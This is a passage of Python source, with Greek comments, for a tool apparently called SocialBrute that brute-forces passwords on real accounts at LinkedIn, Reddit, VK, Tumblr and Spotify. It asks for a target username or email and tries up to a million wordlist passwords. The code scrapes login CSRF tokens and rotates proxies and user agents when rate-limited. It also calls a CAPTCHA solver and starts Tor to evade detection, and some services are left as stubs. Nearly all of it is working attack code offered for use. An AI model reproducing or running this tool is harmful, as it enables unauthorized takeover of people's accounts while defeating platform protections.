                safe_print(f"[TW] Μη αναμενόμενη Εξαίρεση: {e}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class LinkedInBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://www.linkedin.com/checkpoint/lg/login-submit"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()
        
        # Το LinkedIn συχνά απαιτεί ένα CSRF token από την αρχική σελίδα σύνδεσης
        csrf_token = None
        try:
            r_init = local_session.get("https://www.linkedin.com/login", timeout=20)
            match = re.search(r'name="loginCsrfParam" value="([^"]+)"', r_init.text)
            if match:
                csrf_token = match.group(1)
                safe_print(f"[LI] Βρέθηκε loginCsrfParam: {csrf_token}")
                # Το LinkedIn μπορεί να το χρειάζεται στην κεφαλίδα ή στα δεδομένα φόρμας, συνήθως στα δεδομένα φόρμας.
            else:
                safe_print("[LI] Προειδοποίηση: Το loginCsrfParam δεν βρέθηκε. Το brute force στο LinkedIn μπορεί να αποτύχει.")
        except Exception as e:
            safe_print(f"[LI] Σφάλμα κατά τη λήψη της αρχικής σελίδας σύνδεσης/CSRF του LinkedIn: {e}. Ο εργάτης σταματάει.")
            self.queue.put((self.target, self.max_attempts))
            return

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[LI] Καθυστέρηση {current_delay:.2f}s πριν την επανάληψη για το '{pwd}' ({attempts} αποτυχημένες προσπάθειες).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()})
                data = {
                    "session_key": self.target,
                    "session_password": pwd,
                }
                if csrf_token:
                    data["loginCsrfParam"] = csrf_token # Συμπερίληψη του CSRF στα δεδομένα POST
                
                r = local_session.post(login_url, data=data, timeout=20, allow_redirects=False)
                
                if r.status_code == 429:
                    safe_print(f"[LI] Ανιχνεύτηκε όριο ρυθμού (429), αλλαγή proxy και backoff.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue
                elif detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                # Έλεγχος για επιτυχή ανακατεύθυνση (π.χ. σε /feed ή /inbox)
                if r.status_code in [302, 303] and ("feed" in r.headers.get("Location", "") or "inbox" in r.headers.get("Location", "")):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[LI] Η ταυτοποίηση ήταν επιτυχής για τον {self.target} με κωδικό: {pwd}")
                    break
                elif "incorrect-password" in r.text.lower() or "wrong password" in r.text.lower() or "authentication-url" in r.text.lower():
                    # Το "authentication-url" μπορεί να υποδηλώνει 2FA ή παρόμοιες προκλήσεις
                    safe_print(f"\n[LI] Αποτυχημένη προσπάθεια για τον {self.target} με κωδικό: {pwd} (Λανθασμένος/Πρόκληση).")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[LI] Μη διαχειριζόμενη απάντηση για τον {self.target} με κωδικό: {pwd}. Κατάσταση: {r.status_code}, Απάντηση: {r.text[:200]}...")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[LI] Εξαίρεση δικτύου/αιτήματος: {e}. Επανατοποθέτηση στην ουρά και αλλαγή proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[LI] Μη αναμενόμενη Εξαίρεση: {e}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class TikTokBrute(BaseBruteForce):
    def worker(self):
        safe_print("[TT] Το brute force στο TikTok είναι εξαιρετικά πολύπλοκο λόγω προηγμένων μέτρων ασφαλείας, όπως εκτεταμένη ανίχνευση bot, CAPTCHAs και δυναμικά tokens. Αυτή η λειτουργία δεν υλοποιείται αξιόπιστα εδώ χωρίς αυτοματοποίηση headless browser και ειδικές υπηρεσίες επίλυσης CAPTCHA.")
        stop_event.set() # Άμεση διακοπή για το TikTok καθώς δεν είναι εφικτό με την τρέχουσα προσέγγιση

class SnapchatBrute(BaseBruteForce):
    def worker(self):
        safe_print("[SC] Το brute force στο Snapchat είναι εξαιρετικά πολύπλοκο λόγω προηγμένων μέτρων ασφαλείας και αυστηρών ορίων ρυθμού. Αυτή η λειτουργία δεν υλοποιείται αξιόπιστα εδώ.")
        stop_event.set() # Άμεση διακοπή για το Snapchat

class PinterestBrute(BaseBruteForce):
    def worker(self):
        safe_print("[PT] Το brute force στο Pinterest είναι εξαιρετικά πολύπλοκο λόγω προηγμένων μέτρων ασφαλείας. Αυτή η λειτουργία δεν υλοποιείται αξιόπιστα εδώ.")
        stop_event.set() # Άμεση διακοπή για το Pinterest

# --- ΝΕΕΣ ΥΠΗΡΕΣΙΕΣ ΠΡΟΣΤΕΘΗΚΑΝ ΕΔΩ ---

class RedditBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://www.reddit.com/login/"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()

        safe_print("[RD] Προειδοποίηση: Το API σύνδεσης του Reddit προστατεύεται πολύ με CAPTCHAs και όρια ρυθμού. Οι άμεσες μέθοδοι API είναι αναξιόπιστες.")

        # Το Reddit απαιτεί ένα CSRF token για τη σύνδεση, που συνήθως βρίσκεται σε μια κρυφή είσοδο στη σελίδα σύνδεσης.
        modhash = None
        try:
            r_init = local_session.get(login_url, timeout=20)
            # Αναζήτηση για "modhash" ή άλλα tokens τύπου CSRF
            match = re.search(r'name="csrf_token" value="([^"]+)"', r_init.text) # Παράδειγμα
            if not match:
                match = re.search(r'"modhash": "(.*?)"', r_init.text) # Άλλο κοινό token του Reddit
            
            if match:
                modhash = match.group(1)
                safe_print(f"[RD] Βρέθηκε CSRF token/modhash: {modhash}")
            else:
                safe_print("[RD] Προειδοποίηση: Το CSRF token/modhash δεν βρέθηκε. Το brute force στο Reddit μπορεί να αποτύχει.")
        except Exception as e:
            safe_print(f"[RD] Σφάλμα κατά τη λήψη της αρχικής σελίδας σύνδεσης/CSRF του Reddit: {e}. Ο εργάτης σταματάει.")
            self.queue.put((self.target, self.max_attempts))
            return

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[RD] Καθυστέρηση {current_delay:.2f}s πριν την επανάληψη για το '{pwd}' ({attempts} αποτυχημένες προσπάθειες).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({
                    "User-Agent": random_user_agent(),
                    "Referer": login_url,
                    "Content-Type": "application/x-www-form-urlencoded"
                })

                data = {
                    "user": self.target,
                    "passwd": pwd,
                    "api_type": "json"
                }
                if modhash:
                    data["uh"] = modhash # Το Reddit συχνά χρησιμοποιεί 'uh' για modhash/csrf στα δεδομένα φόρμας

                # Επαναληπτική λήψη του modhash εάν η συνεδρία αλλάξει ή καταστεί άκυρη (π.χ. μετά από αλλαγή proxy)
                if not modhash: # Απλός έλεγχος, μπορεί να είναι πιο ισχυρός
                    safe_print("[RD] Επαναληπτική λήψη του CSRF token/modhash...")
                    r_csrf_refresh = local_session.get(login_url, timeout=20)
                    match = re.search(r'name="csrf_token" value="([^"]+)"', r_csrf_refresh.text)
                    if not match:
                        match = re.search(r'"modhash": "(.*?)"', r_csrf_refresh.text)
                    if match:
                        modhash = match.group(1)
                        data["uh"] = modhash
                    else:
                        safe_print("[RD] Προειδοποίηση: Δεν ήταν δυνατή η επαναληπτική λήψη του CSRF token/modhash.")
                        self.queue.put((pwd, attempts + 1))
                        self._update_task(pwd, attempts + 1)
                        local_session = self.get_session_with_proxy()
                        self.queue.task_done()
                        continue

                r = local_session.post(login_url, data=data, allow_redirects=False, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[RD] Ανιχνεύτηκε όριο ρυθμού (429), αλλαγή proxy και backoff.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                json_resp = r.json()
                # Η απάντηση JSON του Reddit για σφάλματα σύνδεσης συνήθως περιέχει ένα κλειδί "errors"
                if not json_resp.get("json", {}).get("errors"):
                    # Η επιτυχία υποδηλώνεται από την απουσία σφαλμάτων ή από μια συγκεκριμένη ανακατεύθυνση/cookie
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[RD] Η ταυτοποίηση ήταν επιτυχής για τον {self.target} με κωδικό: {pwd}")
                    break
                else:
                    error_message = json_resp.get("json", {}).get("errors", [["UNKNOWN", "Unknown error"]])[0][1]
                    safe_print(f"\n[RD] Αποτυχημένη προσπάθεια για τον {self.target} με κωδικό: {pwd}. Σφάλμα: {error_message}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[RD] Εξαίρεση δικτύου/αιτήματος: {e}. Επανατοποθέτηση στην ουρά και αλλαγή proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except json.JSONDecodeError:
                safe_print(f"[RD] Σφάλμα αποκωδικοποίησης JSON - μη αναμενόμενη μορφή απάντησης για τον {self.target}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[RD] Μη αναμενόμενη Εξαίρεση: {e}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class VKBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://m.vk.com/login"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()

        safe_print("[VK] Προειδοποίηση: Το brute force στο VK μπορεί να είναι δύσκολο λόγω ορίων ρυθμού και μέτρων anti-bot.")

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[VK] Καθυστέρηση {current_delay:.2f}s πριν την επανάληψη για το '{pwd}' ({attempts} αποτυχημένες προσπάθειες).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()})
                
                # Το VK συχνά απαιτεί μια παράμετρο 'ip_h' και 'lg_h' από τον πηγαίο κώδικα της σελίδας σύνδεσης.
                # Είναι καλύτερο να τις λαμβάνετε δυναμικά.
                r_init = local_session.get(login_url, timeout=20)
                ip_h_match = re.search(r'name="ip_h" value="([^"]+)"', r_init.text)
                lg_h_match = re.search(r'name="lg_h" value="([^"]+)"', r_init.text)
                
                ip_h = ip_h_match.group(1) if ip_h_match else ""
                lg_h = lg_h_match.group(1) if lg_h_match else ""

                if not ip_h or not lg_h:
                    safe_print("[VK] Προειδοποίηση: Τα tokens ip_h ή lg_h δεν βρέθηκαν. Το brute force στο VK μπορεί να αποτύχει.")
                    # Επανατοποθέτηση στην ουρά με περισσότερες προσπάθειες και δοκιμή νέας συνεδρίας/proxy
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    local_session = self.get_session_with_proxy()
                    self.queue.task_done()
                    continue

                data = {
                    "email": self.target,
                    "pass": pwd,
                    "ip_h": ip_h,
                    "lg_h": lg_h,
                    "role": "button",
                    "to": ""
                }
                
                r = local_session.post(login_url, data=data, allow_redirects=False, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[VK] Ανιχνεύτηκε όριο ρυθμού (429), αλλαγή proxy και backoff.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                # Η επιτυχία στο VK συνήθως ανακατευθύνει στο προφίλ/feed ή ορίζει συγκεκριμένα cookies.
                # Ο λανθασμένος κωδικός συχνά έχει ένα συγκεκριμένο μήνυμα σφάλματος.
                if "remixlhk" in r.cookies or "remixsid" in r.cookies or "feed" in r.headers.get("Location", ""):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[VK] Η ταυτοποίηση ήταν επιτυχής για τον {self.target} με κωδικό: {pwd}")
                    break
                elif "incorrect password" in r.text.lower() or "wrong password" in r.text.lower() or "error" in r.text.lower():
                    safe_print(f"\n[VK] Αποτυχημένη προσπάθεια για τον {self.target} με κωδικό: {pwd} (Λανθασμένος/Σφάλμα).")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[VK] Μη διαχειριζόμενη απάντηση για τον {self.target} με κωδικό: {pwd}. Κατάσταση: {r.status_code}, Απάντηση: {r.text[:200]}...")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[VK] Εξαίρεση δικτύου/αιτήματος: {e}. Επανατοποθέτηση στην ουρά και αλλαγή proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[VK] Μη αναμενόμενη Εξαίρεση: {e}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()


class TumblrBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://www.tumblr.com/login"
        auth_url = "https://www.tumblr.com/svc/auth/signin" # Αυτό είναι πιθανώς ένα τελικό σημείο API
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()

        safe_print("[TB] Προειδοποίηση: Το Tumblr χρησιμοποιεί ισχυρά μέτρα anti-bot και σύνδεση που βασίζεται σε πολύπλοκο JS. Τα άμεσα αιτήματα είναι πολύ δύσκολα.")
        
        # Το Tumblr συχνά απαιτεί ένα CSRF token και πιθανώς άλλες δυναμικές παραμέτρους.
        # Αυτό θα απαιτήσει απόξεση της σελίδας σύνδεσης.
        form_key = None
        try:
            r_init = local_session.get(login_url, timeout=20)
            # Παράδειγμα: Αναζήτηση ενός κρυφού πεδίου εισόδου με όνομα 'form_key'
            match = re.search(r'name="form_key" value="([^"]+)"', r_init.text)
            if match:
                form_key = match.group(1)
                safe_print(f"[TB] Βρέθηκε form_key: {form_key}")
            else:
                safe_print("[TB] Προειδοποίηση: Το form_key δεν βρέθηκε. Το brute force στο Tumblr μπορεί να αποτύχει.")
        except Exception as e:
            safe_print(f"[TB] Σφάλμα κατά τη λήψη της αρχικής σελίδας σύνδεσης/form_key του Tumblr: {e}. Ο εργάτης σταματάει.")
            self.queue.put((self.target, self.max_attempts))
            return

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[TB] Καθυστέρηση {current_delay:.2f}s πριν την επανάληψη για το '{pwd}' ({attempts} αποτυχημένες προσπάθειες).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({
                    "User-Agent": random_user_agent(),
                    "Referer": login_url,
                    "Content-Type": "application/json" # Το Tumblr μπορεί να χρησιμοποιεί JSON για τη σύνδεση API
                })
                
                # Η σύνδεση στο Tumblr μπορεί να είναι μια διαδικασία δύο βημάτων (email και μετά κωδικός).
                # Αυτό το παράδειγμα υποθέτει μια απλή κλήση API για λόγους απλότητας, αλλά το πραγματικό Tumblr είναι πιο δύσκολο.
                data = {
                    "email": self.target,
                    "password": pwd
                }
                if form_key:
                    data["form_key"] = form_key # Συμπερίληψη του form_key εάν χρειάζεται σε JSON ή σε κωδικοποιημένη φόρμα

                r = local_session.post(auth_url, json=data, allow_redirects=False, timeout=20) # Χρήση json=data για το ωφέλιμο φορτίο JSON
                
                if r.status_code == 429:
                    safe_print(f"[TB] Ανιχνεύτηκε όριο ρυθμού (429), αλλαγή proxy και backoff.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                json_resp = {}
                try:
                    json_resp = r.json()
                except json.JSONDecodeError:
                    safe_print(f"\n[TB] Σφάλμα αποκωδικοποίησης JSON - μη αναμενόμενη μορφή απάντησης για τον {self.target}.")

                if json_resp.get("meta", {}).get("status") == 200 and json_resp.get("response", {}).get("authenticated"):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[TB] Η ταυτοποίηση ήταν επιτυχής για τον {self.target} με κωδικό: {pwd}")
                    break
                elif json_resp.get("meta", {}).get("msg") == "Invalid Credentials" or "error" in r.text.lower():
                    safe_print(f"\n[TB] Αποτυχημένη προσπάθεια για τον {self.target} με κωδικό: {pwd} (Μη έγκυρα διαπιστευτήρια/Σφάλμα).")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[TB] Μη διαχειριζόμενη απάντηση για τον {self.target} με κωδικό: {pwd}. Κατάσταση: {r.status_code}, JSON: {json_resp}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[TB] Εξαίρεση δικτύου/αιτήματος: {e}. Επανατοποθέτηση στην ουρά και αλλαγή proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[TB] Μη αναμενόμενη Εξαίρεση: {e}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class SpotifyBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://accounts.spotify.com/api/login"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()

        safe_print("[SP] Προειδοποίηση: Το Spotify έχει ισχυρά μέτρα ασφαλείας κατά των αυτοματοποιημένων συνδέσεων, συμπεριλαμβανομένων CAPTCHA και ορίων ρυθμού.")

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[SP] Καθυστέρηση {current_delay:.2f}s πριν την επανάληψη για το '{pwd}' ({attempts} αποτυχημένες προσπάθειες).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({
                    "User-Agent": random_user_agent(),
                    "Referer": "https://accounts.spotify.com/en/login",
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                })

                data = {
                    "username": self.target,
                    "password": pwd,
                    "remember_me": False,
                    "csrf_token": "a_dummy_csrf_token" # Το Spotify απαιτεί ένα CSRF token, πρέπει να ληφθεί δυναμικά
                }

                # Σε ένα πραγματικό σενάριο, θα κάνατε πρώτα ένα αίτημα GET στη σελίδα σύνδεσης
                # για να εξαγάγετε ένα έγκυρο CSRF token και ενδεχομένως άλλα flow_ids.
                # Παράδειγμα (δεν έχει υλοποιηθεί πλήρως εδώ):
                # r_init_csrf = local_session.get("https://accounts.spotify.com/en/login", timeout=10)
                # csrf_token_match = re.search(r'"csrfToken":"(.*?)"', r_init_csrf.text)
                # if csrf_token_match:
                #    data["csrf_token"] = csrf_token_match.group(1)
                # else:
                #    safe_print("[SP] Προειδοποίηση: Το CSRF token του Spotify δεν βρέθηκε. Η σύνδεση πιθανότατα θα αποτύχει.")
                #    self.queue.put((pwd, attempts + 1))
                #    self._update_task(pwd, attempts + 1)
                #    local_session = self.get_session_with_proxy()
                #    self.queue.task_done()
                #    continue

                r = local_session.post(login_url, json=data, allow_redirects=False, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[SP] Ανιχνεύτηκε όριο ρυθμού (429), αλλαγή proxy και backoff.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                json_resp = {}
                try:
                    json_resp = r.json()
                except json.JSONDecodeError:
                    safe_print(f"\n[SP] Σφάλμα αποκωδικοποίησης JSON - μη αναμενόμενη μορφή απάντησης για τον {self.target}.")

                if json_resp.get("status") == "OK" and json_resp.get("authenticated"):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[SP] Η ταυτοποίηση ήταν επιτυχής για τον {self.target} με κωδικό: {pwd}")
                    break
                elif json_resp.get("error") and "incorrect_username_or_password" in json_resp["error"]:
                    safe_print(f"\n[SP] Αποτυχημένη προσπάθεια για τον {self.target} με κωδικό: {pwd} (Λανθασμένο Όνομα Χρήστη/Κωδικός).")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[SP] Μη διαχειριζόμενη απάντηση για τον {self.target} με κωδικό: {pwd}. Κατάσταση: {r.status_code}, JSON: {json_resp}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[SP] Εξαίρεση δικτύου/αιτήματος: {e}. Επανατοποθέτηση στην ουρά και αλλαγή proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[SP] Μη αναμενόμενη Εξαίρεση: {e}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()


SERVICES = {
    "facebook": FacebookBrute,
    "instagram": InstagramBrute,
    "twitter": TwitterBrute, # Διατηρείται με αποποίηση ευθύνης
    "linkedin": LinkedInBrute,
    "tiktok": TikTokBrute,
    "snapchat": SnapchatBrute,
    "pinterest": PinterestBrute,
    "reddit": RedditBrute,     # ΝΕΟ
    "vk": VKBrute,             # ΝΕΟ
    "tumblr": TumblrBrute,     # ΝΕΟ
    "spotify": SpotifyBrute,   # ΝΕΟ
}

def load_wordlist():
    safe_print("Εισάγετε τη διαδρομή της λίστας λέξεων ή πατήστε Enter για την προεπιλεγμένη (rockyou.txt):")
    path = input(">> ").strip()
    if not path:
        path = ROCKYOU_PATH
    if not os.path.isfile(path):
        safe_print("[!] Η λίστα λέξεων δεν βρέθηκε. Παρακαλώ δώστε μια έγκυρη διαδρομή ή βεβαιωθείτε ότι το rockyou.txt κατέβηκε.")
        return []
    # Αυξημένο όριο για ανάγνωση περισσότερων κωδικών για "υψηλότερο ποσοστό επιτυχίας"
    return load_passwords(path, 1000000) # Φορτώστε έως 1 εκατομμύριο κωδικούς

def main_menu():
    ensure_dirs()
    download_wordlist()
    initialize_proxy_pool() # Αρχικοποίηση δεξαμενής proxy κατά την εκκίνηση
    
    safe_print("\n=== SocialBrute Advanced Multi-Service Brute Forcer ===")
    safe_print("Υποστηριζόμενες υπηρεσίες (Οι λειτουργικές υλοποιήσεις έχουν αποποιήσεις ευθύνης):")
    for s, cls in SERVICES.items():
        if s in ["facebook", "instagram", "linkedin"]: # Αυτές έχουν πιο ρεαλιστικές προσπάθειες
            safe_print(f" - {s} (Πιο ρεαλιστική υλοποίηση, εξακολουθεί να είναι δύσκολη)")
        elif s in ["twitter", "reddit", "vk", "tumblr", "spotify"]: # Αυτές προστίθενται με αποποιήσεις ευθύνης
            safe_print(f" - {s} (Πολύ προστατευμένο/το API είναι παρωχημένο, μπορεί να μην λειτουργεί αξιόπιστα χωρίς headless browser)")
        else:
            safe_print(f" - {s} (Πολύ προστατευμένο, δεν υλοποιείται αξιόπιστα με άμεσα αιτήματα)")

    while True:
        safe_print("\nΕισάγετε το όνομα της υπηρεσίας (ή 'exit' για έξοδο):")
        service = input(">> ").lower().strip()
        if service == "exit":
            safe_print("Έξοδος...")
            stop_event.set()
            break
        if service not in SERVICES:
            safe_print("[!] Μη υποστηριζόμενη υπηρεσία.")
            continue
        
        safe_print(f"Εισάγετε όνομα χρήστη/email/τηλέφωνο στόχου για την υπηρεσία {service}:")
        target = input(">> ").strip()
        if not target:
            safe_print("[!] Ο στόχος δεν μπορεί να είναι κενός.")
            continue
        
        passwords = load_wordlist()
        if not passwords:
            safe_print("[!] Δεν φορτώθηκαν κωδικοί, ακύρωση.")
            continue
        
        safe_print(f"Έναρξη brute force στην υπηρεσία {service} για τον στόχο '{target}' με {len(passwords)} κωδικούς...")
        brute = SERVICES[service](target, passwords, service)
        brute.start()
        safe_print("[*] Η εργασία ολοκληρώθηκε.\n")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        safe_print("\n[*] Διακοπή από τον χρήστη. Έξοδος.")
    finally:
        stop_tor() # Βεβαιωθείτε ότι ο Tor σταματά κατά την έξοδο (αν είχε ξεκινήσει)